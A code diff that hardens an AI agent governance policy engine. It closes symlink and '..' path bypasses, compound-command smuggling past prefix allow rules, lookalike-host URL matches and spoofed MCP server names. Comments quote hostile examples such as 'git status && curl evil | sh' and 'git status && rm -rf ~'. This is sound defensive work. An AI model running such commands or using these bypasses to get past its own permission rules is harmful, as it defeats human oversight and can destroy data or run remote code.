@@ -1,5 +1,5 @@
 import { z } from "zod";
-import { matchesGlob } from "../risk/sensitive.js";
+import { expandPathCandidates, matchesGlob } from "../risk/sensitive.js";
 
 /**
  * Policy engine for AI agent governance.
@@ -197,6 +197,13 @@ export interface PolicyEvalInput {
 		url?: string;
 		tool_name?: string;
 	};
+	/**
+	 * Optional working directory for resolving relative paths during file
+	 * policy evaluation. When provided, the engine evaluates the deny rules
+	 * against the lexically-resolved absolute path AND the realpath
+	 * (symlink-resolved) — closing the symlink-bypass and `..` bypass.
+	 */
+	cwd?: string;
 }
 
 /**
@@ -216,13 +223,36 @@ export function evaluatePolicy(policy: Policy, input: PolicyEvalInput): PolicyDe
 	}
 
 	// 2. Check file rules
-	const filePath = input.target?.path || input.target?.abs_path;
-	if (filePath && isFileAction(input.action)) {
-		const decision = evaluateFileRules(policy.files, filePath);
-		if (decision) return decision;
+	// Evaluate BOTH `path` and `abs_path` (so an adapter that supplies a
+	// benign `path` and a sensitive `abs_path` can't bypass deny rules), and
+	// expand each through pathCandidates() to also cover symlink targets and
+	// `..`-collapsed forms.
+	if (isFileAction(input.action)) {
+		const rawPaths = [input.target?.path, input.target?.abs_path]
+			.filter((p): p is string => typeof p === "string" && p.length > 0);
+		if (rawPaths.length > 0) {
+			const seen = new Set<string>();
+			for (const raw of rawPaths) {
+				for (const candidate of expandPathCandidates(raw, input.cwd)) {
+					if (seen.has(candidate)) continue;
+					seen.add(candidate);
+					const decision = evaluateFileRules(policy.files, candidate);
+					// Deny on first deny match across any candidate
+					if (decision && !decision.allowed) return decision;
+				}
+			}
+			// If no deny matched, evaluate allow/default against the
+			// primary path candidate (preserve original semantics).
+			const primary = rawPaths[0];
+			if (primary !== undefined) {
+				const decision = evaluateFileRules(policy.files, primary);
+				if (decision) return decision;
+			}
+		}
 	}
 
-	// 3. Check command rules
+	// 3. Check command rules — guard against the original `path || abs_path`
+	// short-circuit being repurposed; we already handled file paths above.
 	if (input.target?.command && isCommandAction(input.action)) {
 		const decision = evaluateCommandRules(policy.commands, input.target.command);
 		if (decision) return decision;
@@ -337,12 +367,40 @@ function evaluateCommandRules(
 	return null;
 }
 
+/**
+ * Shell-metacharacter detection for command-allow rules. A `prefix: "git status"`
+ * allow rule must NOT auto-allow `git status && curl evil | sh` — the trailing
+ * compound is unrelated to the prefix the rule promised. We refuse the prefix
+ * match if the command contains any unquoted shell metacharacter past the
+ * matched prefix.
+ *
+ * This is intentionally strict: we reject ANY `;`, `&`, `|`, `<`, `>`, `$`,
+ * backtick, or subshell `(...)`. If a user genuinely needs compound commands,
+ * they should use an `exact:` or carefully-bounded `regex:` rule instead.
+ */
+function hasShellMetacharsAfter(command: string, prefixLen: number): boolean {
+	const tail = command.slice(prefixLen);
+	// eslint-disable-next-line no-useless-escape
+	return /[;&|<>$`(){}]|\\\n/.test(tail);
+}
+
 function matchesCommandRule(
 	command: string,
 	rule: z.infer<typeof CommandRuleSchema>,
 ): boolean {
-	if (rule.prefix && command.toLowerCase().startsWith(rule.prefix.toLowerCase())) {
-		return true;
+	if (rule.prefix) {
+		const ruleLc = rule.prefix.toLowerCase();
+		const cmdLc = command.toLowerCase();
+		if (cmdLc.startsWith(ruleLc)) {
+			// Reject if the rest of the command contains shell metacharacters —
+			// otherwise allowlisting "git status" would let through
+			// `git status && rm -rf ~`. Rules that need compound commands should
+			// be expressed with `exact:` or a strict `regex:`.
+			if (rule.action === "allow" && hasShellMetacharsAfter(command, rule.prefix.length)) {
+				return false;
+			}
+			return true;
+		}
 	}
 	if (rule.exact && command.trim() === rule.exact) {
 		return true;
@@ -409,7 +467,28 @@ function matchesNetworkRule(
 		}
 	}
 	if (rule.url_prefix) {
-		return url.startsWith(rule.url_prefix);
+		// Raw prefix matching is unsafe: `https://api.github.com` allows
+		// `https://api.github.com.evil.tld/...`. Parse both URLs and require
+		// scheme + hostname to match exactly, then check the path is a prefix
+		// up to a path boundary (`/` or end-of-string).
+		try {
+			const target = new URL(url);
+			const allowed = new URL(rule.url_prefix);
+			if (target.protocol !== allowed.protocol) return false;
+			if (target.hostname !== allowed.hostname) return false;
+			if (target.port !== allowed.port) return false;
+			const wantPath = allowed.pathname;
+			const gotPath = target.pathname;
+			if (!gotPath.startsWith(wantPath)) return false;
+			// Path boundary: the prefix must end at the URL or at a `/` —
+			// `https://x/api` must NOT match `https://x/api-evil/...`.
+			if (gotPath.length > wantPath.length && !wantPath.endsWith("/")) {
+				return gotPath[wantPath.length] === "/";
+			}
+			return true;
+		} catch {
+			return false;
+		}
 	}
 	return false;
 }
@@ -452,17 +531,35 @@ function evaluateMcpRules(
 	return null;
 }
 
+/**
+ * Parse an MCP tool name into its (server, tool) parts.
+ * Format: `mcp__<server>__<tool>`. Returns null if the name does not match.
+ *
+ * Strict regex parse — substring matching `__github__` would let
+ * `mcp__evil__github__delete_everything` inherit GitHub's allow rules.
+ */
+function parseMcpToolName(toolName: string): { server: string; tool: string } | null {
+	// `mcp__` prefix, then a server name with no `__` inside, then `__`, then the tool.
+	const m = /^mcp__([^_][^]*?)__([^]+)$/.exec(toolName);
+	if (!m) return null;
+	const server = m[1];
+	const tool = m[2];
+	if (!server || !tool) return null;
+	if (server.includes("__")) return null;
+	return { server, tool };
+}
+
 function matchesMcpRule(
 	toolName: string,
 	rule: z.infer<typeof McpRuleSchema>,
 ): boolean {
-	// MCP tool names follow pattern: mcp__<server>__<tool>
 	if (rule.tool && toolName === rule.tool) {
 		return true;
 	}
 	if (rule.server) {
-		// Match by server prefix (e.g., server "github" matches "mcp__github__create_issue")
-		return toolName.includes(`__${rule.server}__`) || toolName.startsWith(`${rule.server}__`);
+		const parsed = parseMcpToolName(toolName);
+		if (!parsed) return false;
+		return parsed.server === rule.server;
 	}
 	return false;
 }
